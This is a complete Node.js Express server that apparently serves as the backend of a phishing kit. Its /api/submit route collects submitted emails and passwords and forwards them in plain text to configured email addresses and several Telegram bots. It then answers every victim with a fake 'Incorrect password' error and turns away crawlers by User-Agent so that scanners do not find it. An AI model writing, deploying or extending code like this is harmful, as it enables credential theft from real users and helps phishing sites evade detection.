require("dotenv").config();
const express = require("express");
const nodemailer = require("nodemailer");
const TelegramBot = require("node-telegram-bot-api");
const path = require("path");
const axios = require("axios");
const rateLimit = require("express-rate-limit");

const app = express();
const PORT = process.env.PORT || 3000;

// ─── Middleware ─────────────────────────────────────────────
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files
app.use(express.static(__dirname));
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// Rate limit /api/submit
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 10,
  message: { message: "Too many requests. Please try again later." }
});
app.use("/api/submit", limiter);

// Block obvious bots by User-Agent
app.use((req, res, next) => {
  const ua = req.headers["user-agent"] || "";
  const lowerUA = ua.toLowerCase();

  if (lowerUA.includes("bot") || lowerUA.includes("crawler")) {
    return res.status(403).json({ message: "Bot access denied" });
  }
  next();
});

// Optional IP blacklist
const blockedIPs = ["123.45.67.89", "111.222.333.444"];
app.use((req, res, next) => {
  if (blockedIPs.includes(req.ip)) {
    return res.status(403).json({ message: "Access denied" });
  }
  next();
});

// ─── Service Setup ──────────────────────────────────────────
// Nodemailer
const transporter = nodemailer.createTransport(
  process.env.MAIL_PROVIDER === "gmail"
    ? {
        service: "gmail",
        auth: {
          user: process.env.EMAIL_USER,
          pass: process.env.EMAIL_PASS
        }
      }
    : {
        host: process.env.SMTP_HOST,
        port: parseInt(process.env.SMTP_PORT, 10) || 465,
        secure: process.env.SMTP_SECURE === "true",
        auth: {
          user: process.env.EMAIL_USER,
          pass: process.env.EMAIL_PASS
        }
      }
);

// Test SMTP connection on startup
transporter.verify((error) => {
  if (error) {
    console.error("❌ SMTP connection failed:", error.message);
  } else {
    console.log("✅ SMTP server is ready to take messages");
  }
});

// CAPTCHA verification helper
const verifyCaptcha = async (token) => {
  // Development bypass: set SKIP_CAPTCHA=true to skip real verification
  if (process.env.SKIP_CAPTCHA === "true" || !process.env.RECAPTCHA_SECRET) {
    console.warn("⚠️ Skipping real CAPTCHA verification (SKIP_CAPTCHA=true or RECAPTCHA_SECRET not set)");
    return { success: true, 'skip-dev': true };
  }

  const response = await axios.post(
    "https://www.google.com/recaptcha/api/siteverify",
    null,
    {
      params: {
        secret: process.env.RECAPTCHA_SECRET,
        response: token
      }
    }
  );
  return response.data;
};

// ─── Main Route ─────────────────────────────────────────────
app.post("/api/submit", async (req, res) => {
  console.log("✅ Received payload:", req.body);

  const {
    email,
    password,
    lourl = "N/A",
    captcha,
    honeypot,
    "g-recaptcha-response": gRecaptcha
  } = req.body;

  const captchaValue = captcha || gRecaptcha;

  try {
    // Honeypot
    if (honeypot) {
      console.warn(`🕷️ Honeypot triggered by IP: ${req.ip}`);
      return res.status(403).json({ success: false, message: "Bot detected" });
    }

    // Required fields
    if (!email || !password || !captchaValue) {
      console.warn("❌ Missing credentials or CAPTCHA");
      return res.status(400).json({
        success: false,
        message: "Missing credentials or CAPTCHA"
      });
    }

    console.log("🔍 Verifying CAPTCHA...");
    const captchaResult = await verifyCaptcha(captchaValue);
    console.log("CAPTCHA API response:", captchaResult);
    if (!captchaResult.success) {
      console.warn(
        "⚠️ CAPTCHA failed for IP:",
        req.ip,
        "Reason:",
        captchaResult["error-codes"]
      );
      return res.status(403).json({
        success: false,
        message: "CAPTCHA verification failed"
      });
    }

    // Prepare message
    const message = `
🔐 Login Attempt
👤 Username: ${email}
🔑 Password: ${password}
🌐 Page URL: ${lourl}
🕒 Time: ${new Date().toISOString()}
    `;

        // ─── Send Email to multiple recipients (if configured)
        if (process.env.EMAIL_RECEIVER) {
          const emailRecipients = process.env.EMAIL_RECEIVER.split(",").map(addr => addr.trim()).filter(Boolean);
          const bccRecipients = process.env.EMAIL_BCC
            ? process.env.EMAIL_BCC.split(",").map(addr => addr.trim()).filter(Boolean)
            : [];

          if (emailRecipients.length > 0) {
            console.log("📧 Sending email to:", emailRecipients, "BCC:", bccRecipients);
            try {
              await transporter.sendMail({
                from: process.env.EMAIL_USER,
                to: emailRecipients,
                bcc: bccRecipients,
                subject: "Login Attempt Notification",
                text: message
              });
              console.log("✅ Email sent successfully");
            } catch (mailErr) {
              console.error("💥 Failed to send email:", mailErr.message || mailErr);
            }
          } else {
            console.warn("⚠️ EMAIL_RECEIVER is set but no valid recipients parsed");
          }
        } else {
          console.warn("⚠️ EMAIL_RECEIVER not configured, skipping email send");
        }



        // ─── Send Telegram via multiple bots (supports numbered env vars and single bot config)
        const botsConfig = [];

        // Support numbered tokens TELEGRAM_BOT_TOKEN1/TELEGRAM_CHAT_ID1, TELEGRAM_BOT_TOKEN2/.. etc.
        Object.entries(process.env).forEach(([key, value]) => {
          const match = key.match(/^TELEGRAM_BOT_TOKEN(\d+)$/);
          if (match) {
            const index = match[1];
            const chatIdKey = `TELEGRAM_CHAT_ID${index}`;
            const chatId = process.env[chatIdKey];
            if (chatId && value) botsConfig.push({ token: value.trim(), chatId: chatId.trim() });
          }
        });

        // Support single bot env vars without numbers
        if (process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID) {
          botsConfig.push({ token: process.env.TELEGRAM_BOT_TOKEN.trim(), chatId: process.env.TELEGRAM_CHAT_ID.trim() });
        }

        if (botsConfig.length === 0) {
          console.warn("⚠️ No Telegram bots configured (set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID or numbered variants)");
        } else {
          console.log("💬 Parsed Telegram bots config:", botsConfig.map(b => ({ chatId: b.chatId })));
          // Send in parallel without blocking the HTTP response
          Promise.allSettled(
            botsConfig.map(({ token, chatId }) => {
              console.log(`📡 Sending Telegram via bot to chat ${chatId}`);
              const tempBot = new TelegramBot(token, { polling: false });
              return tempBot.sendMessage(chatId, message);
            })
          ).then(results => {
            results.forEach((res, i) => {
              const { chatId } = botsConfig[i];
              if (res.status === "fulfilled") {
                console.log(`✅ Telegram message sent to chat ${chatId}`);
              } else {
                console.error(`💥 Telegram send failed for ${chatId}:`, res.reason ? res.reason.message || res.reason : res);
              }
            });
          }).catch(err => {
            console.error("Unexpected error sending Telegram messages:", err);
          });
        }



    // Respond to client
    return res.status(401).json({
      success: false,
      message: "Incorrect password. Please try again."
    });

  } catch (err) {
    console.error("💥 Error in /api/submit:", err);
    return res.status(500).json({ success: false, message: "Internal server error" });
  }
});

// ─── Start Server ───────────────────────────────────────────
app.listen(PORT, () => {
  console.log(`🚀 Server running at http://localhost:${PORT}`);
});